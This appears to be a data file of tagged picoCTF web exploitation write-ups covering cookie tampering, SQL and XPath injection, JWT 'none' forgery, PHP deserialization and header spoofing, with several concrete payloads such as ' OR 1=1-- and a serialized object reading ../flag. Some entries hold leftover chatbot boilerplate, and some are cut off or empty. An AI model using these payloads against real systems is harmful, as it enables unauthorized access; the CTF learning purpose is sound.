Looking at the HTML of the website, we can see that both red and blue buttons make a request to the same URL, however with different HTTP request methods. We can make the educated guess that the flag will be accessible by using a different HTTP request method.

#discovery
Using the tool Burp Suite, we can try HTTP requests with different request methods. Unfortunately, both ""PUT"" and ""DELETE"" do not result in the flag. Looking at the MDN Web Docs, we can see that there are actually 9 different HTTP request methods, one of which being ""HEAD"".

#exploitation
As this challenge is named ""Get aHEAD"", we can conclude that we must use the ""HEAD"" method to get the flag.
"
"02_Cookies_tagged.txt","Web Exploitation","Title: Cookies
Topics: Web Exploitation, Cookie Manipulation
Vulnerabilities: Session hijacking
Tools used: Browser extension
Keywords: cookie

#context
We visit the website and see the following message: ""Welcome to my cookie search page. See how much I like different kinds of cookies!""

#discovery
Let's check the cookie we get from the server.

#exploitation
What if we try to access with a different cookie name? I use a browser extension to modify the cookie.

#discovery
Let's search for that special cookie by trying different numbers in the name.
"
"03_Insp3ct0r_tagged.txt","Web Exploitation","Title: Insp3ct0r
Topics: Web Exploitation, Information Gathering
Vulnerabilities: Improper Access Control, Information Leakage
Tools used: Developer Tools
Keywords: HTML, CSS, JavaScript, inspect

#context
Visiting the website, we don't see anything out of the ordinary.

#discovery
We right click and choose to inspect the source code.
Here we get the first third of the flag, included as a html comment.
The second part of the flag comes from the referenced CSS file mycss.cs.
The last part comes from the Javascript scipt myjs.js.

#exploitation
Hence combining the 3 parts gives the flag.
"
"05_Some_Assembly_Required_1_tagged.txt","Web Exploitation","Title: Some Assembly Required 1
Topics: Web Exploitation, Information Gathering
Vulnerabilities: Improper Access Control, Information Leakage
Tools used: Developer Tools
Keywords: JavaScript, WebAssembly, path

#context
Upon visiting the website, it appears to just be a textbox with a form.

#discovery
After inspecting the website, I can see there's a JavaScript file. I inspect that file.
The first time I looked at it I gave up in 5 seconds. Anyways, in the const declaration one of the elements caught my attention. There is a path.
I visited that path and it gave a WebAssembly file.
At the bottom of the file, there was the flag.
"
"06_More_Cookies_tagged.txt","Web Exploitation","Title: More Cookies
Topics: Web Exploitation, Cryptography, Cookie Manipulation
Vulnerabilities: Cryptographic Flaws, Session hijacking
Tools used: Python script
Keywords: cookie, homomorphic encryption, CBC bitflip, admin

#context
Looking at the website, we deduce this is a continuation of the ""Cookies"" challenge. So let's have a look. This time the page reads: ""Welcome to my cookie search page. Only the admin can use it!"".

#discovery
Let's check the cookie we get from the server and we notice it's encoded. It's a base64 encoding but when I decode it, it's still in gibberish, So it's encrypted.

#context
Let's see the Hint 1: it links to a Wikipedia page for a very interesting encryption method (homomorphic encryption). It's more like an algorithm than an encryption formula.

#discovery
Reading articles about the homomorphic encryption and looking at other writeups I understand that we do not have to decrypt it to solve it, indeed this encryption allows you to perform operations on encrypted text.
Also, I noticed that the letters ""CBC"" are oddly capitalized in the challenge description. So, It's a CBC bitflip.

#exploitation
Meaning the encrypted text contains a bit that determines if it's admin or not. Probably something like admin=0 but I don't know its position, so I brute-forced it using a python script.
"
"07_where_are_the_robots_tagged.txt","Web Exploitation","Title: where are the robots
Topics: Web Exploitation, Information Gathering
Vulnerabilities: Misconfigured Web Server, Information Leakage
Tools used: Developer Tools
Keywords: robots.txt

#context
Once we open the link, we are greeted with a seemingly basic website. The title of the problem suggests to look for a robots.txt file.

#discovery
A robots.txt file is a text file that blocks automatic web robots from running. A common mistake people make is they put secret information in files listed in the robots.txt file. When we look for this file we see a directory excluded.

#exploitation
By going to that we see the flag.
"
"08_logon_tagged.txt","Web Exploitation","Title: logon
Topics: Web Exploitation, Cookie Manipulation
Vulnerabilities: Session hijacking
Tools used: Developer tools
Keywords: cookie, admin

#context
No matter what credentials we use for the login, it successfully logs us in, but doesn't give us the flag. 

#discovery
This suggests that a cookie might be used to store a separate variable that might be preventing us from seeing the flag.
We open the cookie and we notice an admin variable set to False.

#exploitation
Changing this to True and refreshing the page gives us the flag.
"
"09_dont-use-client-side_tagged.txt","Web Exploitation","Title: dont-use-client-side
Topics: Web Exploitation, Information Gathering, Client-side Validation
Vulnerabilities: Information Leakage
Tools used: Bash script, Developer Tools
Keywords: client side, check, credentials

#context
Opening the website greets us with a login page, requiring credentials.

#discovery
As referenced by the challenge name, we assume that the check for the validity of the credentials is checked client side, and hence can be reversed to obtain the correct password.
The first obvious thing to do as nothing else is look at the page source code hoping to find anything important. And boom, we win the lottery!

#exploitation
We got that the password is checked split in parts against the flag itself divided in parts.
We use a bash script to join them together and obtain the flag.
"
"10_It_is_my_Birthday_tagged.txt","Web Exploitation","Title: It is my Birthday
Topics: Web Exploitation, Cryptography, Cookie Manipulation
Vulnerabilities: Cryptographic Flaws
Tools used: Python script
Keywords: MD5, hash collision, PDF

#context
We have a website with the possibility to upload two PDF files. The description of the challenge states: ""I sent out 2 invitations to all of my friends for my birthday! I'll know if they get stolen because the two invites look similar, and they even have the same md5 hash, but they are slightly different! You wouldn't believe how long it took me to find a collision. Anyway, see if you're invited by submitting 2 PDFs to my website."".

#discovery
So, we're dealing with a hash collision problem. Nowadays it's trivial to generate an MD5 collision of two images/PDF files. Take any two PDFs of different contents, we can make them have the same MD5 hash. I used a Python script to generate two PDFs with the same MD5 hash.

#exploitation
After we've generated the two colliding PDFs, we uploaded them, and the website redirected to the source code.
The flag can be found in a comment at the end of the code, at line 37.
"
"11_Who_are_you_tagged.txt","Web Exploitation","Title: Who are you
Topics: Web Exploitation, HTTP Headers
Vulnerabilities: Spoofing
Tools used: Postman, cURL, Burp Suite
Keywords: HTTP header, User-Agent, Referer, Date, DNT, X-Forwarded-For, Accept-Language

#context
When we visit the site, it says: ""Only people who use the official PicoBrowser are allowed on this site!""""

#discovery
There are many ways to approach this, I ended up using Postman's HTTP request, but some alternatives are cURL and Burp Suite.

#exploitation
We'll unhide requests and override the default User-Agent request with a PicoBrowser agent. Now the site says: ""I don't trust users visiting from another site."".
So, we need to make the HTTP header show it's from the same site. We'll use Referer header. Now, it says: ""Sorry, this site only worked in 2018."".
We'll use the Date header with any value from 2018. Now, it says: ""I don't trust users who can be tracked."".
We can set the DNT header which means ""do not track"" to 1 (true). Now, it says: ""This website is only for people from Sweden."".
We can use the X-Forwarded-For header which will change the originating IP address. Grab any random IP address from Sweden. Now, it says: ""You're in Sweden but you don't speak Swedish?"".
We can use the Accept-Language header to specify which languages are ok. We can look through a list of languages and find Sweden's subtag is `sv`.
At the end, we get the flag.
"
"12_login_tagged.txt","Web Exploitation","Title: login
Topics: Web Exploitation, Information Gathering, Client-side Validation
Vulnerabilities: Information Leakage
Tools used: Developer Tools
Keywords: base64, encode, decode

#context
On first inspection, we faced with a login screen.

#discovery
It seems like SQL injection, because ""isn't that what always happens with logins in CTFs?"". However, it's a lot simpler than that. After navigating to the website source, we encounter a .js file. After a pretty printing, it's just vanilla JavaScript.
The important part of the code is in line 12, where it's checking for a username and password that has been turned into base64 from ASCII via the `btoa()` method, which is reversible with the `atob()` method. The password itself is the flag when decoded.

#exploitation
Opening the Chrome console and undoing the encoding, results in the flag. If you're not convinced it's the real flag, you can decode the username (admin) and input both into the login form, which results in an alert announcing the flag.
"
"15_Local_Authority_tagged.txt","Web Exploitation","Title: Local Authority
Topics: Web Exploitation, Information Gathering, Client-side Validation
Vulnerabilities: Information Leakage
Tools used: Developer Tools
Keywords: JavaScript, PHP, CSS

#context
When you go to the website, you find a login screen.

#discovery
To find out more about the inner workings of the website, we look at the source code (right-click on the page). Nothing visible at first sight. We dive deeper and look at PHP, JavaScript and CSS files.
Surprisingly, some of the source codes in the `login.php` are shown to us. This is because the logic that is handling our login credentials is in the Javascript function in HTML that is echoed to us. The function `filter()` obviously checks if the entered field contains only allowed letters. The JavaScript code following the function definition reads the entered values and passes them on to a function called `checkPassword()` which is not defined in this document. Since we are looking for JavaScript code, we look into `secure.js`.

#exploitation
Okay, that was not difficult. The login credentials for the website are here. If we copy the password, go back to the login screen, enter the password together with the username, we get the flag.
"
"17_Some_Assembly_Required_2_tagged.txt","Web Exploitation","Title: Some Assembly Required 2
Topics: Web Exploitation, Reverse Engineering
Vulnerabilities: Cryptography Flaws, Information Leakage
Tools used: Developer Tools, Python, CyberChef
Keywords: JavaScript, WebAssembly, XOR

#context
Upon visiting the website, it appears to just be a text-box with a form.

#discovery
After inspecting the website, I can see there's a JavaScript file. I inspect that file. The first time I looked at it I gave up in 5 seconds. Anyways, in the const declaration one of the elements caught my attention. There is a path. I visited that path and it gave a WebAssembly file.
Until now, it's all identical to the last challenge, except that a slightly different bas64 wasm string is downloaded. Using a Python script I converted the string to an actual wasm file. I translate the wasm file to wat file, then I translate it to pseudo code and analyze the result. Note that this is not C code, it is C-like code. When compared with the decompiled wasm code for the previous challenge, only some lines are new/changed at the end of the `copy` function. So we can assume that the magic happens in the `copy`. We can see that this new version includes some extra logic.

#exploitation
What seems to be happening here is that the characters from the flag are getting XORed with 8 before being saved at offset 1072+. We can also see that the string that `check_flag()` uses to compare the user input to the expected flag (at offset 1024+) doesn't contain the flag in clear anymore. I copied the variable content which can be seen from the decoded base64 text into CyberChef. I used the magic block to search for `picoCTF` and sure enough it found the flag. Apparently, the decoding is a XOR with 8.
"
"18_Super_Serial_tagged.txt","Web Exploitation","Title: Super Serial
Topics: Web Exploitation
Vulnerabilities: Deserialization, Object Injection
Tools used: Developer Tools, CyberChef
Keywords: cookie, PHP, deserialization, base64

#context
Going to the robot file, we notice that `admin.phps` is disallowed. This indicates that the phps extension is enabled within the php configuration for this webserver. Files with the phps extension contain php code but instead of running when they are accessed, they return an HTML representation of the literal php code. ""phps"" stands for ""PHP source"".

#discovery
We can access `index.phps` code, that points us in the direction of `authentication.php`. Looking at the code, it points us in the direction of `cookie.php`. We look at its code.
OK. A few things to note here. The `cookie.php` file is included in every page. In it we have a code segment that will deserialize our cookie and print the object when an error occurs: `(""Deserialization error. "".$perm)`.
I start thinking we are in the context of a deserialization vulnerability.

#exploitation
We can store any object in the cookie and it will be unserialized. One option is to exploit the `__construct` function, since this is ran immediately when the object is created. However, in both the access_log and permissions classes, there does not appear to be a valid gadget chain.

#discovery
Conveniently, the `access_log` class in `authentication.php` has the `__toString()` method, that is one of the PHP magic methods that override PHP's default behaviour. This method is called when the object is converted to a string. So if we could get the above `$perm` variable to be our custom `access_log` object, we could achieve arbitrary file read on the target system.
To do this, we simply serialize our custom `access_log` object, where we set `log_file` to `../flag`. The php serialized `access_log` object looks like this: ```O:10:""access_log"":1:{s:8:""log_file"";s:7:""../flag"";}```. Fore more details about this syntax, we can search for ""exploiting php deserialization"" on Google.

#exploitation
Let's encode that to base64 and url encode it using CyberChef.
Now, we can add it as the `login` cookie on our browser and go to `authentication.php`. Note that we need to use `authentication.php` because that is the file where the required `access_log` class is defined. Our custom `access_log('../flag')` object will be deserialized into `$perm`. This will most definitely generate an error because the `access_log` class has no such methods. This will catch the error and concatenate `$perm` to the `""Deserialization error. ""` string. In doing so, `$perm` is converted to a string. This invokes the `__toString()` method which reads `../flag`!
"
"19_Most_Cookies_tagged.txt","Web Exploitation","Title: Most Cookies
Topics: Web Exploitation, Information Gathering, Cookie Manipulation
Vulnerabilities: Session Hijacking, Information Leakage
Tools used: Developer Tools, Python script, CyberChef, Burp Suite
Keywords: hardcoded, bruteforce, cookie, admin

#context
Let's visit the site. And analyze the source code. The `/display` page checks the session cookie. From this, it is clear we need to become admin to swipe that flag!

#discovery
We need to change the `very_auth` session value to `admin` somehow. Looking at the server script (`server.py`) code, we can see that the Flask session secret key is hardcoded into the source code! This key is set to a random cookie name. This secret key is used to sign a flask session cookie so that it cannot be modified. However, since we know the secret key is one of the 28 cookie names, we can simply try them all until we successfully decrypt the cookie. We use a Python script to bruteforce each secret in the wordlist.
So, the first step is to go to the website and copy a valid session cookie. Use our old friend Developer Tools: `Inspect > Application > Storage > Cookies`. Let's use CyberChef to decode that cookie value (it was base64 encoded). We observe that the header is `{ ""very_auth"": ""blank"" }`. Yikes. We want to be `admin` instead of `blank`.

#exploitation
Putting this new crafted cookie back into Burp Suite, we get the flag in the response.
"
"20_caas_tagged.txt","Web Exploitation","Title: caas
Topics: Web Exploitation
Vulnerabilities: Command Injection
Tools used: None
Keywords: command, injection

Visiting the attached website, we see a page implementing cowsay as a service.
In an attempt to exploit potential vulnerabilities, we try to inject a command by appending it with a semicolon after the current command. This technique is commonly known as command injection and can allow unauthorized commands to be executed on the server.
"
"21_Some_Assembly_Required_3_tagged.txt","Web Exploitation","Title: Some Assembly Required 3
Topics: Web Exploitation, Reverse Engineering
Vulnerabilities: Cryptography Flaws, Information Leakage
Tools used: Developer Tools, Python, diff, CyberChef
Keywords: JavaScript, WebAssembly, XOR

#context
Upon visiting the website, it appears to just be a text-box with a form. After inspecting the website, I can see there's a JavaScript file. I inspect that file. The first time I looked at it I gave up in 5 seconds. Anyways, in the const declaration one of the elements caught my attention. There is a path. I visited that path and it gave a WebAssembly file.

#discovery
Like the last challenge, a bas64 wasm string is downloaded. Using a Python script I converted the string to an actual wasm file. I translate the wasm file to wat file, then I translate it to pseudo code and analyze the result. Note that this is not C code, it is C-like code. We use diff to compare the new wasm with the wasm from the previous challenge. We can see that this new version includes some extra logic. We see the addition of a new variable, named `key`, and some changes at the end of the `copy_char`.

#exploitation
We discover that the flag is XORed with the reverse of the key. I'm not sure why the key needs to be reversed, but it could have something to do with big endian and little endian since wasm is close to machine code.
An alternative way to find the key is as follows.
We know (from step 6) that the key is 5 bytes. We also know that the flag starts with `picoCTF{`. Thus, we can XOR the start of the flag (`picoC`) with the encrypted flag `0x9d, 0x6e, 0x93, 0xc8, 0xb2` to find that they key is: `0xed 0x07 0xf0 0xa7 0xf1`.
The latter logic comes from the XOR cipher: if `ciphertext = plaintext XOR key` then `ciphertext XOR plaintext = key`.
Translating this logic to a Python script we get the flag.
"
"22_Web_Gauntlet_2_tagged.txt","Web Exploitation","Title: Web Gauntlet 2
Topics: Web Exploitation
Vulnerabilities: SQL Injection
Tools used: None
Keywords: login form, filter, username, password, SQL injection, admin

#context
The attached website gives us a standard login form. If we enter credentials we even get the SQL query run on the server. So we can deduce the site is vulnerable to SQL injection.

#discovery
Looking at the filter link we can see what we must avoid when crafting our SQL injection. According to `filter.php` the application filters are the following: `or and true false union like = > < ; -- /* */ admin`.

#exploitation
We know that the username field must be ""admin"", but entering it as plaintext gets blocked, as we have seen. To bypass this we can simply use the `||` joiner (not filtered) with a final value for the username field of `ad'||'min`. For the password field we must simply provide something that returns true. The most common one used is `' OR '1'='1`, but `OR` is filtered as seen. Instead we can craft a true statement using `IS` or `IS NOT` such as `a' IS NOT 'b` which is also true. Using the final values of username and password for login we get the message ""Congrats! You won! Check out `filter.php`"".
Finally reloading the page gives us its source code with the flag.
"
"23_picobrowser_tagged.txt","Web Exploitation","Title: picobrowser
Topics: Web Exploitation, HTTP Headers
Vulnerabilities: Spoofing
Tools used: cURL
Keywords: HTTP header, User-Agent

#context
This website has a button you can press that will give you the flag. However, if you press it in your web browser, it will give you an error saying ""You're not picobrowser!"" and list some text after it that depends on your OS and browser.

#discovery
For me, it says: ""Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:70.0) Gecko/20100101 Firefox/70.0, but yours will likely be different)"". That string of text is known as an User-Agent and it tells the server what browser you're using.

#exploitation
To convince them that you're running a ""picobrowser"", you can just change your User-Agent HTTP header To do this, I chose to use cURL because it easily allows you to control the headers.
"
"24_Client-side-again_tagged.txt","Web Exploitation","Title: Client-side-again
Topics: Web Exploitation, Information Gathering, Client-side Validation, Code Obfuscation
Vulnerabilities: Information Leakage
Tools used: Developer Tools, Python script
Keywords: client side, obfuscated, script

#context
We visit the website and inspect the source code. Let's call a JavaScript beautifier in order to make the JavaScript code a bit more readable.

#discovery
We see that `_0x4b5b` is a function used to obfuscate different values. It is calculated in runtime. Luckily, we can use the browser's Developer Tools console in order to evaluate the obfuscated function and read its values.
Let's replace the function calls with hardcoded values to improve readability.

#exploitation
So this is very similar to another challenge already seen, using `substring` to authenticate the password. Indeed we have some substrings composing the flag. Note that there are some overlaps. An evil way to turn this into a flag would be by transforming the JavaScript code into a Python array assignment script and executing it.
This gives us the flag at the price of allowing exec to slip into our code.
"
"28_Power_Cookie_tagged.txt","Web Exploitation","Title: Power Cookie
Topics: Web Exploitation, Information Gathering, Cookie Manipulation
Vulnerabilities: Session Hijacking
Tools used: Developer Tools
Keywords: cookie, admin

#context
As suggested by the challenge name, the solution likely involves changing a cookie value.

#discovery
If we go to the website, we find that there are no cookies saved. However, if we click the `continue as guest` button, we can see, using the Developer Tools that a cookie with the name `admin` is generated, with the value 0.

#exploitation
0 means `False` here, so if we change the cookie's value to 1 (`True`) and refresh, the website treats us like the admin, giving us the flag.
"
"29_Roboto_Sans_tagged.txt","Web Exploitation","Title: Suspicious robots.txt
Primary topic: Web Exploitation
Secondary topic: Base64 decoding
Tools used: None
Keywords: base64, suburl

#context
The challenge name seems to be either an allusion to the text font Roboto or /robots.txt.

#discovery
As investigating the text font files seems more complicated, let's first look at /robots.txt. The text in here disallow looks suspicious.

#code
The double equal sign suggests that it's base 64. However, if we try to decode it with an online decoder, it seems like the base 64 is a little malformed. As the base 64 text spans across three lines, it suggests that it is actually three separate strings.

#discovery
If we decode each line separately, we find that the second line gives us a valid path, specifically js/myfile.txt.

#exploitation
If we navigate to the suburl, we get the flag.
"
"30_Secrets_tagged.txt","Web Exploitation","Here is the tagged version of the provided writeup text:

```
Title: Hidden Flag in CSS
Primary topic: Web Exploitation
Secondary topic: None
Tools used: None
Keywords: secret, hidden, HTML source

#discovery
If we right click -> inspect and look at the sources tab, we find that some of the assets are in a suspiciously named folder called ""secret"".
If we navigate to the secret suburl, we find a website that says ""Finally. You almost found me. you are doing well"".

#discovery
We are on the right track. If we repeat the same process as before, we find that there is another suspiciously named folder, ""hidden"", so we navigate to it.

#discovery
We keep on repeating this process until we reach a website that says ""Finally. You found me. But can you see me"".

#countermeasures
The flag is probably hidden by the css. We can just look at the HTML source to get the flag.
```"
"31_SQL_Direct_tagged.txt","Web Exploitation","Here's the tagged version of the provided writeup text:

```
Title: PostgreSQL Flag Retrieval
Primary topic: Database Exploitation
Secondary topic: SQL Injection
Tools used: None
Keywords: PostgreSQL, flag

#context
Let's connect to the PostgreSQL.

#discovery
Now, Let's run /dt to list the tables of the public schema.

#exploitation
Now let's run select command from flags table on public schema.

#code
And we get the flag.

#countermeasures
None.
```

Please let me know if you have any further questions or if there's anything else I can help you with."
"32_X_marks_the_spot_tagged.txt","Web Exploitation","Title: X marks the spot
Primary topic: Web Exploitation
Secondary topic: XPATH Injection
Tools used: None
Keywords: XPATH, SQL injection

#context
Visiting the website, we are presented with a login form (and a Robert Frost poem).

#discovery
The hint says ""XPATH"", and using some common XPATH injection techniques we can leak some information about the underlying DB. The idea is similar to SQL injection. We have a vulnerable query for authenticating the username and password.

#exploitation
So, if we inject some valid XPATH vocabulary into the query, we can manipulate it. Experimenting with the query we can check if the password of the first username is longer than 1 character. If we submit this as the username, we get back a response from the server telling us that ""You're on the right path"", so we can deduce that password is longer than 1. In the same way, we can check that the password is shorter than 30 characters. Let's use the following syntax to iterate some users and check if someone's password starts with ""a"", ""b"", ""c"", etc. We can write a script that uses XPATH substring to brute force the password character by character.

#code
None

#countermeasures
None"
"33_notepad_tagged.txt","Web Exploitation","Title: notepad
Primary topic: Web Exploitation
Secondary topic: Directory Traversal
Tools used: None
Keywords: Flask, RCE

#context
We visit the website and get a note-taking application. After posting a note, the note contents get saved to a file on the server and we can visit it and view the note.

#discovery
Reviewing the code, we know"
"34_Irish-Name-Repo_1_tagged.txt","Web Exploitation","Title: Irish-Name-Repo 1
Primary topic: Web Exploitation
Secondary topic: SQL Injection
Tools used: None
Keywords: SQL database

#context
When we open the site, we see the content of the main page is not very helpful. When we look at the Support page however, we see an inquiry saying: ""Hi. I tried adding my favorite Irish person, Conan O'Brien. But I keep getting something called a SQL Error."" This tells us that the site uses a SQL database.

#exploitation
When we go to the Admin Login, we can try a basic SQL Injection to bypass the portal. Our injection is specifically having the username as ' OR 1=1-- and the password as whatever. What is happening here is the query checks if the username is equal to nothing. Then, it checks OR 1=1. Since 1 is always going to be equal to 1, this returns true. The -- at the end simply comments out the rest of the query. This fools the server into letting us through the portal.

#code
' OR 1=1--
"
"35_Web_Gauntlet_3_tagged.txt","Web Exploitation","Title: Web Gauntlet 3
Primary topic: Web Exploitation
Secondary topic: SQL Injection
Tools used: None
Keywords: username, password, filter.php

#context
The challenge is the exact same as Web Gauntlet 2 but we now have a 25 total character limit for our username and password field entry.

#code
```
username: ad'||'min
password: a' IS NOT 'b
```

#exploitation
After inputting these values for username and password we login and get the message ""Congrats! You won! Check out filter.php"".

#context
Reloading the filter.php file we get the source code for the challenge along with the flag in the comments just as for Web Gauntlet 2."
"36_JAuth_tagged.txt","Web Exploitation","Title: JAuth
Primary topic: Web Exploitation
Secondary topic: JWT Token
Tools used: None
Keywords: JWT, algorithm, signature

#context
We get a test user. If we log in, we get an empty page. Let's look at the login HTTP request. Hmmm... nothing interesting. If we get set Remember me on we get the same request. Let's check our cookies.

#discovery
This is a JWT token. A JWT is separated into three parts. The first is called a header and is being used for general information like the token type and algorithm, the second part is the payload (the info we want to store) and the last one is the signature which makes sure the token is valid. All the tokens parts are separated by a dot and are encoded in based64. Let's decode it.

#exploitation
We have a role part that is set to user. So we can just change it to admin and hippity hoppity your site is my property? Hell no. Doing that the signature will become invalid and you will just be logged out. So what can we do? Let's take a look at the token again. We can see that the token is holding the algorithm it used to verify itself on itself. It means that we can change the algorithm to none, and the token will just check for none algorithm on the signature. So let's do it, first let's change the header. Do the same for the payload (make sure you change it to admin), then add the header and the payload together separated by a dot and also add another dot at the end and don't add a signature at all. Just change the cookie and refresh, it will now log you as an admin!

#code
None

#countermeasures
None mentioned."
"37_SQLiLite_tagged.txt","Web Exploitation","Title: SQLiLite
Primary topic: Web Exploitation
Secondary topic: SQL Injection
Tools used: None
Keywords: SQL command, payload, flag

#context
Connecting to the website will give us a login form. In the hints, it is given that the user is ""admin"".

#discovery
We tried logging in with the credentials ""admin"" and ""admin,"" but it failed. We realized that the input we give is entering into the SQL command, so we have to use SQL injection techniques to exploit this.

#exploitation
We tried a common SQLi payload: `admin' or 1=1--`. This sets our own condition and passes the command. By adding "" -- "" we comment out the remaining part of the SQL command.

#discovery
Now we can see that we are logged in, but the flag is hidden.
We checked the source code of the page and found the flag.
"
"38_Irish-Name-Repo_2_tagged.txt","Web Exploitation","Here is the tagged version of the provided writeup text:

```
Title: Irish-Name-Repo 2
Primary topic: Web Exploitation
Secondary topic: SQL Injection
Tools used: None
Keywords: blind SQLi, filter bypass

#context
This site looks a lot like the one from Irish-Name-Repo 1, yet once we try this same SQL Injection of ' OR 1=1-- here, we get nothing but a page that says SQLi detected.

#discovery
After some playing around, we can figure out that the filter detects several keywords, including UNION which was the solution for last year's SQLi filter challenge.

#exploitation
However, after some blind SQLi, we bypass the filter by setting the username to admin'-- and the password to whatever. We are guessing that the username here should be admin and then commenting out the rest so that the password is not checked.

#code
None

#countermeasures
None
```"
"39_Irish-Name-Repo_3_tagged.txt","Web Exploitation","Title: Irish-Name-Repo 3
Primary topic: Web Exploitation
Secondary topic: SQL Injection
Tools used: None
Keywords: encryption, Caesar cipher

#context
Once again we are brought back to what seems like the same page as in Irish-Name-Repo 1 and 2. Except this time, when we enter a SQL Injection such as ' or 1=1--, we get a server-side HTTP error 500. We also note that there is now only a password input, so no way of revealing anything... or is there?

#discovery
When we inspect element this page, we can notice that there is more than one input, just that one of them is hidden and set to 0. If we set this to 1, we can actually see the query we are inputting after the encryption that messes up our injections occurs.

#exploitation
This time, when we inject the same injection ' or 1=1--, we get back our encrypted query. In which we can see that the alphabetical characters 'o' and 'r' have been swapped to a 'b' and 'e'. Curious. Let's try putting every letter in the alphabet after the comment to see exactly what type of encryption this is while setting the hidden input to 1 still. We can now confirm that this is some type of Caesar cipher. The characters for the word OR are substituted for BE. We try our query again, this time following the encryption, as so: ' be 1=1--. The portal lets us through, and we finally see our flag.

#code
`' be 1=1--`
"
"40_JaWT_Scratchpad_tagged.txt","Web Exploitation","Title: JaWT Scratchpad
Primary topic: Web Exploitation
Secondary topic: JWT
Tools used: hashcat

#context
The challenge involves a web application that uses JWT for authentication.

#discovery
The first step is to log in as any user and obtain the JWT token from the jwt cookie.

#exploitation
Next, we use hashcat to crack the token and obtain the password used. We then change the ""user"" in the JWT payload to ""admin"" and sign it again using the password found.

#code
`hashcat -m 16500 token.txt rockyou.txt`

#countermeasures
This challenge highlights the importance of properly securing JWT tokens and avoiding common vulnerabilities such as weak passwords. It also emphasizes the need for proper access control and user authentication mechanisms.
"
"41_Java_Script_Kiddie_tagged.txt","Web Exploitation","Title: Java Script Kiddie
Primary topic: Web Exploitation
Secondary topic: Cryptography
Tools used: jQuery, zbar
Keywords: PNG, bytes, key, QRCode

#context
Get a look at the webpage source code.

#discovery
Run:
```
$.get(""bytes"", function(resp) {bytes = Array.from(resp.split("" ""), x => Number(x));});
```
from the source code in developer console to get a list of bytes.

#exploitation
The website takes the above list of bytes and shifts them based on the key the user enters. For each character in the key, the script shifts every 16th byte starting with byte i, where i is the index of the character in the key. In this way, the first 16 bytes of the image correspond to the 16 digits in the user-specified key.

#code
I used a script that, for each character of the key, will try all digits until one is found that places the expected value in the current location.

#countermeasures
Enter key into website and save the QRCode PNG image.

#code
Use zbar on the image to get the flag."
"42_Java_Script_Kiddie_2_tagged.txt","Web Exploitation","Here is the tagged version of the provided writeup text:

```
Title: Java Script Kiddie 2
Primary topic: Web Exploitation
Secondary topic: JavaScript
Tools used: None
Keywords: webpage source code, developer console, bytes, key, QRCode, zbar

#context
Get a look at the webpage source code.

#discovery
Run
```
$.get(""bytes"", function(resp) {bytes = Array.from(resp.split("" ""), x => Number(x));});
```
from the source code in developer console to get a list of bytes.

#context
This website is similar to the first ""Java Script Kiddie"" except for a line that effectively ignores every second value in the key.

#exploitation
Since var LEN = 16 is the same, the script for the previous challenge can be used again but with a random value (I chose 0) added between character.

#code
So, the script used, for each character of the key, will try all digits until one is found that places the expected value in the current location. It also adds padding (0) after each digit found.

#countermeasures
Enter key into website and save the QRCode PNG image.

#discovery
Use zbar on the image to get the flag.
```"
"01_open-to-admins_tagged.txt","Web Exploitation","Here is the tagged version of the provided writeup text:

```
Title: open-to-admins
Primary topic: Web Exploitation
Secondary topic: None
Tools used: Firefox extension (Cookie Manager)
Keywords: cookies, admin, time

#context
After a ton of research and testing, I found out that it was a lot easier than I thought.

#discovery
You have to modify the cookies and add 2 fields: admin and time. (I used a Firefox extension called Cookie Manager).

#countermeasures
None

#code
None
```

Please let me know if you have any further questions or if there's anything else I can help you with.
"
"02_Empire1_tagged.txt","Web Exploitation","Title: Empire1
Primary topic: Web Exploitation
Secondary topic: SQL Injection
Tools used: None
Keywords: sqli, query injection, dbms

#context
First thing we notice when we open the homepage is register and login pages, but they doesn't seem to be vulnerable to SQL injection. So we create a user and we login.

#discovery
Let's see that create todo page, if we try to inject a simple ' in the todo we get an internal server error, so we know that probably we can inject SQL. In fact, if we try a simple a' OR '1'='1, the query is executed, and in the todo list, we can see the output 1.

#exploitation
If we play a little with queries, we will find that a good method to inject a query is this a' || (some_query) || 'b.

#discovery
Now we have to find some info about the DBMS. In order to do that, we have to understand which DBMS is being used. We try to select information_schema, which is MySQL, but it won't work. If we try sqlite_master, it will work, so we print some information, and then we can start printing the good stuff.

#exploitation
The challenge description clearly says us to find our secret. So if we print the secret ""column"" of every user selected by his id, we are gonna find ours and with it our flag.

#code
None

#countermeasures
None"
"03_Empire2_tagged.txt","Web Exploitation","Here is the tagged version of the provided writeup text:

```
Title: Empire2
Primary topic: Web Exploitation
Secondary topic: None
Tools used: None
Keywords: flask, cookies, session

#context
First of all let's register and login, then we try to create a todo with {{config}} and we can see in the list of todos a lot of information about the flask server.

#discovery
We can see the secret key to sign cookies.

#discovery
Get the flask session cookie encoded.

#exploitation
And if we decode it with flask-session-cookie-manager we actually find our flag.
```

Please let me know if you have any further questions or if there's anything else I can help you with."
"04_Empire3_tagged.txt","Web Exploitation","Title: Empire3
Primary topic: Web Exploitation
Secondary topic: Flask Secret Key
Tools used: flask-session-cookie-manager
Keywords: cookies, user_id

#context
We are presented the usual company website, we register and login as usual and we try to add a todo {{config}}.

#discovery
We go in the list of todos and we have a lot of information, the most important is the flask secret key which is used to sign the cookies.

#discovery
Now we check if there is any cookie saved by the website and we find that there is one.

#exploitation
Decrypting it with flask-session-cookie-manager we discover that it contains a user_id field, maybe we can change it and login as another user.

#exploitation
We try set user_id to 1 and we encode the cookie again. As we send the cookie we actually login as jarret.booz but no flag here.

#exploitation
Let's try user_id = 2 and we actually find the flag.

#countermeasures
This challenge highlights the importance of properly securing session management and cookie handling in web applications. It also emphasizes the need for secure coding practices to prevent vulnerabilities such as this one."
"05_cereal_hacker_1_tagged.txt","Web Exploitation","Here is the tagged version of the provided writeup text:

```
Title: cereal hacker 1
Primary topic: Web Exploitation
Secondary topic: Credential Bruteforcing
Tools used: Hydra, Firefox, CyberChef
Keywords: cookies, base64 encoding

#context
It will be foundamental later. After a ton of guessing and a little hint from the official discord page of picoCTF we found that the credentials to log in as a regular user were: username=guest and password=guest. The really intresting part in this page are the cookies, in fact there is a new cookie base64 encoded called user_info.

#discovery
Credential bruteforcing: The credentials can be found with hydra and the http[s]-{get|post}-form module. The user= and pass= are the post variables found from the debugging console in Firefox.

#exploitation
Login as guest:guest. Get cookie. URL and Base64Decode using CyberChef. Change the cookie. Encoding using CyberChef. Set cookie to new cookie. Change URL to file=admin. You got the flag.

#code
N/A

#countermeasures
N/A
```"
"01_HTML_Code_source_tagged.txt","Web Exploitation","Title: None
Primary topic: None
Secondary topic: None
Tools used: None
Keywords: None

#context
By showing the source code HTML of the page, we found this comment.

#code
